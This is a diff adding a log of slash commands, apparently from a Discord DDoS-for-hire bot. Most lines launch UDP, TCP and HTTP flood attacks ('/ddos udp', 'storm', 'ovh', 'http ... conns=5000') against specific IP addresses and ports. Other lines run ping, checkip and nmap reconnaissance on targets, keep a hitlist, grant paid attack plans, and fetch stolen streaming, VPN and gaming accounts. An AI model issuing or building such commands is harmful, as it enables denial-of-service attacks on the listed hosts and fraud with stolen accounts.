@@ -1,0 +1,178 @@
+/tr4p
+/ddos udp 1.1.1.1 90
+/accounts
+/xboxcode
+/vpn
+/methods
+/hulu
+/ping 97.102.88.242
+/ddos udp 97.102.88.242 99 dport=80
+/ping 97.102.88.242
+/ping 97.102.88.242
+/ddos std 128.116.65.219 120 dport=49356
+/ping 128.116.65.219
+/ddos std 128.116.65.219 120 dport=995
+/checkip 81.90.191.17
+/methods
+/ddos stdhex 81.90.191.17 99 dport=995
+/ping 81.90.191.17
+/ping 81.90.191.17
+/ddos std 98.109.15.9 73 dport=80
+/ddos stdhex 104.16.148.244 90 dport=22
+/ping 104.16.148.244
+/ping 104.16.148.244
+/ipcheck 104.16.148.244
+/tr4p
+/checkip 104.16.148.244
+/methods
+/ddos ovh 104.16.148.244 100 dport=80
+/ping 104.16.148.244
+/ddos stdhex 201.146.211.63 100 dport=3074
+/methods
+/ping 104.16.148.244
+/ddos storm 97.102.88.242 30 dport=3074
+/ping 97.102.88.242
+/plans
+/ddos stdhex 81.90.191.17 77 dport=80
+/ping 81.90.191.17
+/ddos storm 97.102.88.242 1000 dport=3074
+/ddos storm 97.102.88.242 120 dport=3074
+/ping 97.102.88.242
+/ddos ack 95.156.209.28 100 dport=995
+/ping 95.156.209.28
+/checkip 95.156.209.28
+/getplan <@462797597690822656>
+/getplan <@462797597690822656> monthly
+/reboot
+/free lifetime plan me
+/getplan <@462797597690822656>
+/changeplan  699173595833827379 3
+/changeplan
+/freeplan
+/getplan
+/changeplan 462797597690822656 1
+/ddos fbi
+/ddos http 82.100.220.42 60 domain=aiqoon.de conns=5000
+/ddos http 205.251.242.103 100 donain=205.251.242.103 conns=5000
+/ddos nike.com
+/ddos ack 95.156.209.28 100 dport=80
+/ping 95.156.209.28
+/checkip 69.148.188.51
+/plan
+/plans
+/plan
+/ddos udp 73.228.161.219 300 dport=80
+/ddos udp 73.228.161.219 120 dport=80
+/ping 73.228.161.219
+/checkip 73.228.161.219
+/plan
+/ddos std 1.1.1.1 70 dport=8
+/ddos std 1.2.3.4 80 dport=8
+/ddos udp 174.198.223.43 9 dport=8
+/getfreeplan
+/tr4p
+/getplan <@462797597690822656>
+/bitch
+/tr4p
+/nmap 74.91.119.228
+/ipcheck 74.91.119.228
+/checkip 45.56.200.41
+/getplan <@462797597690822656>
+/changeplan 623367729788878860 1
+/plan
+/checkip 82.42.203.160
+/tr4p
+/methods
+/tr4p
+/gh
+/checkip 82.42.203.160
+/plan <@704887825660641400>
+/plans
+/methods
+/netflix
+/tr4p
+/accounts
+/vpn
+/vpn
+/vpn
+/hulu
+/steamcode
+/mega
+/spotify
+/vpn
+/checkip 174.59.227.114
+/ping 174.59.227.114
+/vpn
+/xboxcode
+/vpn
+/hulu
+/checkip 67.249.112.189
+/plans
+/methods
+/hitlist
+/lagstop
+/bugbounty
+/info
+/ddos
+/checkip 139.28.216.34
+/ddos fbi
+/checkip 10.8.0.9
+/checkip 76.114.242.250
+/hitlist
+/plans
+/bugbounty
+/checkip 2.125.54.74
+/dbfind user
+/checkip 162.248.94.195
+/plans
+/netflix
+/accounts
+/hulu
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/nvnap 73.73.73.3 42
+/nmap 73.73.73.3
+/nmapresult
+/tr4p
+/lag
+/lag udp 73.73.73.3
+/bean
+/methods
+/methods2
+/give1000euro for plan
+/gay
+/bugbounty
+/g4y
+/ga7
+/send 40 euro go <@305921615282307083>
+/checkip 192.208.73.45
+/ping 192.208.73.45
+/hulu
+/hulu
+/REALHULU
+/hulu
+/hulu
+/accounts
+/hulu
+/hulu
+/checkip 76.114.242.250
+/hitlist
+/hitlist
+/hitlist
+/plan
+/plan
+/checkip 192.168.0.69
+/checkip 51.89.254.24
+/blacklist
+/dbfind jake
+/changeplan <@462797597690822656> 3
+/checkip 212.103.49.141
+/checkip 8.45.47.19
+/checkip 8.6.112.214
+/checkip 8.45.47.19
+/methods
+/checkip 192.223.27.249
